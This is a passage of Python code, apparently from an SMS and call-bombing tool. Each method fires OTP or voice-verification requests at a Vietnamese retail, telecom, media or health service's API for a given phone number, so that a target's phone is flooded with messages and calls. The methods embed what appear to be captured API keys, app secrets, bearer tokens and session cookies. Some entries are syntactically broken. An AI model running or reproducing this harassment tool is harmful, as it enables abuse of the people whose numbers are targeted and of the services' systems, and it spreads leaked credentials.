            session, "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
            method="POST",
            headers={
                  'accept': '*/*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
                  'content-type': 'application/json',
                  'order-channel': '1',
                  'origin': 'https://fptshop.com.vn',
                  'priority': 'u=1, i',
                  'referer': 'https://fptshop.com.vn/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                },
            json={
                  'fromSys': 'WEBKHICT',
                  'otpType': '0',
                  'phoneNumber': sdt,
                },
            data={
                  'fromSys': 'WEBKHICT',
                  'otpType': '0',
                  'phoneNumber': sdt,
                },
            api_name="FPTSHOP"
        )

    def send_iloka(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "http://back.iloka.vn:9999/api/v2/customer/sentVoiceOTP",
            method="POST",
            headers={
                  'Host': 'back.iloka.vn:9999',
                  'Content-Type': 'application/json',
                  'Origin': 'capacitor://localhost',
                  'Connection': 'keep-alive',
                  'Accept': 'application/json, text/plain, */*',
                  'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
                  'Content-Length': '22',
                  'Accept-Language': 'vi-VN,vi;q=0.9',
                  'Accept-Encoding': 'gzip, deflate',
                },
            json={
                  "phone": sdt,
                },
            data={
                  "phone": sdt,
                },
            api_name="ILOKA"
        )

    def send_norifood(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://gateway.norifood.vn/sso/api/auth/sendOTP",
            method="POST",
            headers={
                  'Host': 'gateway.norifood.vn',
                  'Content-Type': 'application/json',
                  'User-Agent': 'NoriFood/25021801 CFNetwork/3826.400.120 Darwin/24.3.0',
                  'Connection': 'keep-alive',
                  'Accept': 'application/json',
                  'secret-code': '7bc79fa5139b8266e12993014bb68955',
                  'Content-Length': '34',
                  'Accept-Encoding': 'gzip, deflate, br',
                  'Accept-Language': 'vi-VN,vi;q=0.9'
                },
            json={
                  "phone": sdt,
                  "type": None,
                },
            data={
                  "phone": sdt,
                  "type": None,
                },
            api_name="NORIFOOD"
        )

    def send_fa88(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://pmbodergw.dsrcgoms.net/otp/send",
            method="POST",
            headers={
                  'accept': '*/*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'content-type': 'application/json',
                  'origin': 'https://v.fa88.tv',
                  'priority': 'u=1, i',
                  'referer': 'https://v.fa88.tv/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'cross-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                  'x-token': 'bcdb79c350327745b7522a40d4ab673b',
                },
            json={
                  'phone': sdt,
                  'app_id': 'fa88club',
                  'fg_id': '146fca9965e795f8f787485ecca8c61d',
                },
            data={
                  'phone': sdt,
                  'app_id': 'fa88club',
                  'fg_id': '146fca9965e795f8f787485ecca8c61d',
                },
            api_name="FA88"
        )

    def send_vhome(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://vcloudapi.innoway.vn/api/app/otp/vhome",
            method="POST",
            headers={
                  'host': 'vcloudapi.innoway.vn',
                  'accept': '*/*',
                  'content-type': 'application/json',
                  'appkey': 'nlaDOC8uS6Xn7L0JIcPD',
                  'user-agent': 'VTHome/2 CFNetwork/3826.400.120 Darwin/24.3.0',
                  'appsecret': 'yKeMoImiHp9DUXxoGpERza31xSyCWunW',
                  'traceparent': '00-F1D0BD06A5534C8BB05BE6FD5D1A0066-0000000000000000-01',
                  'accept-language': 'vi-VN,vi;q=0.9',
                  'content-length': '44',
                  'accept-encoding': 'gzip, deflate, br'
                },
            json={
                  "otp_type": "register",
                  "phone": sdt,
                },
            data={
                  "otp_type": "register",
                  "phone": sdt,
                },
            api_name="VHOME"
        )

    def send_phuha(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "http://phuha.winds.vn/api/service/CheckPhone",
            method="POST",
            headers={
                  'Host': 'phuha.winds.vn',
                  'Content-Type': 'application/json',
                  'User-Agent': 'PHUHA/4 CFNetwork/3826.400.120 Darwin/24.3.0',
                  'Connection': 'keep-alive',
                  'Accept': '*/*',
                  'token': '',
                  'Content-Length': '22',
                  'Accept-Encoding': 'gzip, deflate',
                  'Accept-Language': 'vi-VN,vi;q=0.9'
                },
            json={
                  "phone": sdt, 
                },
            data={
                  "phone": sdt, 
                },
            api_name="PHUHA"
        )

    def send_aemon(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://membersapp.aeon.com.vn/api/otp",
            method="POST",
            headers={
                  'Host': 'membersapp.aeon.com.vn',
                  'Content-Type': 'application/json',
                  'Accept-Encoding': 'gzip, deflate, br',
                  'Cookie': 'language=vi',
                  'Connection': 'keep-alive',
                  'x-api-key': '3EB76D87D97C427943957C555AB0B60847582D38CB1688ED86C59251206305E3',
                  'Accept': 'application/json',
                  'User-Agent': 'com.aeonvn.membersapp/1.6.5/IOS/RELEASE',
                  'Accept-Language': 'vi',
                  'x-request-id': 'D650BC1C-5C71-4CD3-BBDC-7D46741E5AFD',
                  'Content-Length': '40'
                },
            json={
                  "screen": 1,
                  "phone_number": sdt,
                },
            data={
                  "screen": 1,
                  "phone_number": sdt,
                },
            api_name="AEMON"
        )

    def send_fptplay(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.foxpay.vn/v1/oauth/account/register",
            method="POST",
            headers={
                  'Host': 'api.foxpay.vn',
                  'client-type': 'App',
                  'ip-address': '14.191.171.193',
                  'Authorization': 'Bearer t10xelgj5/nVbKRCBm04N6mbb23rc7wd6ZUlBXHG7TcfT4MRX2Xi8pPQk2oG8No6LzOZCMUZKcodHF20aAXE61qnaSKgNJUS+21bE7uZZlhfNfpXnPfVLFdfmsXLN6mlmff7jGalsGBIN/doiklFJp0Cl9J6oYB7Yfy7AYbb0JjcgcbAMfW6h2xQCiwus/rYoU7dyqz2u4ZvDCz8gMO7FP36Xk6Qu8opj44ZqpEy+a8kYgqriLNW2aSCO6TFlEXkOF1QoIye0KYSSKCtFsWji2aq/uMXELDB9NHM7/g4okznCpuIfnPewAC2cEz9VdGhiTtqNvk6F+v5uddVsfRO4bFjTXF94MqP3A8sRiqF8RYoXl4mvLvKUszDf47F5vsR4S2Senv/CxF8nXBicVevaFYfEEIvJlqp6r3MqKtosHKiFOiiqQVqUTxI98L/Suhl/Ja+Jg6iwW2cGDGRJfkYewTvR8AlQHHjyaIIaJa5IzkM/WtVmJjUVhkW0Yhch2IW6BgLyDCrctZaobRsLZeZfBzjm/1m0L5WILAp9tL9VKBHv3lWYikaAauk4mLawKK76PChgfTaqqg6yvtIjS0RRwkWCHtYp1vCGl7R47Q8+q4+EJK86/ZjxDEZXqLh9T2FO/sa9BTv9wPM/8CKaCaiqC8TJC4NMQhFL4Lu20d+e5td3bRYyx7+oVQTlOYGp4VnauiAou7NwYUnvGUb7PeePYP821fnVaQwMRZkhdbuOINSxp7vtie5W7W6wZ5FN2R0vCo/ONUmQkurM2LdfQZeLdsXTqvR4kbrtfEeZ4aCbgpcWrEvNK6CzupCU6FotfOp2aQrsyAkhR632RF8tDNH3yptn4aH2QhuM22WX3j1tQ2TwRgVasBop3MCk4R1QpkMxqKaOBy1gXs6taigUnxVC2Hqt1IAukJqxH9jeNcrg+yhr8zQBhFOGvUesoXXvsEGysQ0FL91WI9CTAcqZ7kDGbGKjETpwr9zXksVlPW+tr88D3/ZbjbvhT8MQURqTExeDucif/TXQJdxQIpzy5Es1Nqx6lFHiHArbU3Nh3RG92C+LoMq01WH/y28vnUqKqyTtaZc/VMBP3HkkNJZBLAglA==',
                  'Accept': '*/*',
                  'device-id': 'D5E6B9C9-E00F-492B-BBEC-FB363708A940',
                  'client-version': '3.2.2.1',
                  'device-type': 'iOS_18_3_2_iPhone_11',
                  'Accept-Encoding': 'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
                  'Accept-Language': 'vi-VN;q=1.0',
                  'Content-Type': 'application/json',
                  'Content-Length': '56',
                  'User-Agent': 'FPT Pay/3.2.2 (com.ftel.foxpay; build:1; iOS 18.3.2) Alamofire/5.6.4',
                  'lang': 'vi',
                  'Connection': 'keep-alive'
                },
            json={
                  "username": sdt,
                  "country_code": "84"
                },
            data={
                  "username": sdt,
                  "country_code": "84"
                },
            api_name="FPTPLAY"
        )

    def send_savyu(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.savyu.com/api/otp/send-code",
            method="POST",
            headers={
                  'host': 'api.savyu.com',
                  'content-type': 'application/json',
                  'consumer-app-version': '6.4.1',
                  'accept': 'application/json',
                  'accept-language': 'vi-VN,vi;q=0.9',
                  'accept-encoding': 'gzip, deflate, br',
                  'deviceuuid': 'BA857157-060E-4A4C-A2C6-FC0D628894D0',
                  'deviceinfo': 'iPhone12,1',
                  'user-agent': 'SavyuConsumer/1 CFNetwork/3826.400.120 Darwin/24.3.0',
                  'content-length': '111',
                  'osversion': '18.3.2',
                  'devicebrand': 'Apple'
                },
            json={
                  "account": sdt,
                  "country_code": "+84",
                  "device_uuid": "BA857157-060E-4A4C-A2C6-FC0D628894D0",
                  "platform": 3,
                },
            data={
                  "account": sdt,
                  "country_code": "+84",
                  "device_uuid": "BA857157-060E-4A4C-A2C6-FC0D628894D0",
                  "platform": 3,
                },
            api_name="SAVYU"
        )

    def send_call_viettel(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://viettel.vn/api/getOTPLoginCommon",
            method="POST",
            headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json;charset=UTF-8',
                    'DNT': '1',
                    'Origin': 'https://viettel.vn',
                    'Referer': 'https://viettel.vn/myviettel',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'X-CSRF-TOKEN': 'H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            cookies={
                    'laravel_session': 'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
                    'redirectLogin': 'https://viettel.vn/myviettel',
                    'XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D',
                },
            json={
                    'phone': sdt,
                    'typeCode': 'DI_DONG',
                    'actionCode': 'myviettel://login_mobile',
                    'type': 'otp_login',
                },
            data={
                    'phone': sdt,
                    'typeCode': 'DI_DONG',
                    'actionCode': 'myviettel://login_mobile',
                    'type': 'otp_login',
                },
            api_name="CALL_VIETTEL"
        )

    def send_call_medicare(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://medicare.vn/api/otp",
            method="POST",
            headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    'Origin': 'https://medicare.vn',
                    'Referer': 'https://medicare.vn/login',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                    'X-XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0=',
                    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            cookies={
                    'SERVER': 'nginx2',
                    '_gcl_au': '1.1.481698065.1722327865',
                    '_tt_enable_cookie': '1',
                    '_ttp': 'sCpx7m_MUB9D7tZklNI1kEjX_05',
                    '_gid': 'GA1.2.1931976026.1722327868',
                    '_ga_CEMYNHNKQ2': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
                    '_ga_8DLTVS911W': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
                    '_ga_R7XKMTVGEW': 'GS1.1.1722327866.1.1.1722327876.50.0.0',
                    '_ga': 'GA1.2.535777579.1722327867',
                    'XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D',
                    'medicare_session': 'eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWlGL2JNa3NmKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyNGUxNGY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D',
                },
            json={
                    'mobile': sdt,
                    'mobile_country_prefix': '84',
                },
            data={
                    'mobile': sdt,
                    'mobile_country_prefix': '84',
                },
            api_name="CALL_MEDICARE"
        )

    def send_call_tv360(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://tv360.vn/public/v1/auth/get-otp-login",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://tv360.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'starttime': '1722324791163',
                    'tz': 'Asia/Bangkok',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            cookies={
                    'img-ext': 'avif',
                    'NEXT_LOCALE': 'vi',
                    'session-id': 's%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM',
                    'device-id': 's%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg',
                    'shared-device-id': 'web_89c04dba-075e-49fe-b218-e33aef99dd12',
                    'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
                    'G_ENABLED_IDPS': 'google',
                },
            json={
                    'msisdn': sdt,
                },
            data={
                    'msisdn': sdt,
                },
            api_name="CALL_TV360"
        )

    def send_call_dienmayxanh(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            method="POST",
            headers={
                    'Accept': '*/*',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'DNT': '1',
                    'Origin': 'https://www.dienmayxanh.com',
                    'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'X-Requested-With': 'XMLHttpRequest',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            cookies={
                    'TBMCookie_3209819802479625248': '657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=',
                    '___utmvm': '###########',
                    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
                    'SvID': 'new2690|Zqilx|Zqilw',
                    'mwgngxpv': '3',
                    '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TQ7UQGmBzPEH6s6-tzBBTiKEgcfjZWXpY8_IL-DTacK3it55OPdddwuXNc2mgQzfoEMl9eFbSuvHz3ySnzPW-Ww4YccqMERZSMCsSY8f1eBwOpd9HzD1YsnrhTwgAuLxM',
                    'DMX_Personal': '%7B%22UID%22%3A%225cb3bf4ae0e8e527f2e3813bf976bee79ea330dc%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
                },
            data={
                    'phoneNumber': sdt,
                    'isReSend': 'false',
                    'sendOTPType': '1',
                    '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU',
                },
            api_name="CALL_DIENMAYXANH"
        )

    def send_call_kingfoodmart(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.onelife.vn/v1/gateway/",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
                    'authorization': '',
                    'content-type': 'application/json',
                    'domain': 'kingfoodmart',
                    'origin': 'https://kingfoodmart.com',
                    'priority': 'u=1, i',
                    'referer': 'https://kingfoodmart.com/',
                    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                },
            json={
                    'operationName': 'SendOtp',
                    'variables': {
                        'input': {
                            'phone': sdt,
                            'captchaSignature': 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
                        },
            data={
                    'operationName': 'SendOtp',
                    'variables': {
                        'input': {
                            'phone': sdt,
                            'captchaSignature': 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
                        },
            api_name="CALL_KINGFOODMART"
        )

    def send_call_mocha(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",
            method="POST",
            headers={
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Origin': 'https://video.mocha.com.vn',
                'Pragma': 'no-cache',
                'Referer': 'https://video.mocha.com.vn/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                },
            params={
                'msisdn': sdt,
                'languageCode': 'vi',
                },
            api_name="CALL_MOCHA"
        )

    def send_call_fptdk(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json; charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://fptplay.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://fptplay.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-did': 'A0EB7FD5EA287DBF',
                },
            json={
                    'phone': sdt,
                    'country_code': 'VN',
                    'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
                },
            data={
                    'phone': sdt,
                    'country_code': 'VN',
                    'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
                },
            api_name="CALL_FPTDK"
        )

    def send_call_fptmk(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://fptplay.vn/_nuxt/pages/block/_type/_id.26.0382316fc06b3038d49e.js",
            method="GET",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'dnt': '1',
                    'referer': 'https://fptplay.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'script',
                    'sec-fetch-mode': 'no-cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            cookies={
                    'auth.strategy': '',
                    'expire_welcome': '14400',
                    'fpt_uuid': '%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22',
                    'ajs_group_id': 'null',
                    'G_ENABLED_IDPS': 'google',
                    'CDP_ANONYMOUS_ID': '1722362340735',
                    'CDP_USER_ID': '1722362340735',
                },
            json={
                    'phone': sdt,
                    'country_code': 'VN',
                    'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
                },
            data={
                    'phone': sdt,
                    'country_code': 'VN',
                    'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
                },
            api_name="CALL_FPTMK"
        )

    def send_call_VIEON(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.vieon.vn/backend/user/v2/register",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
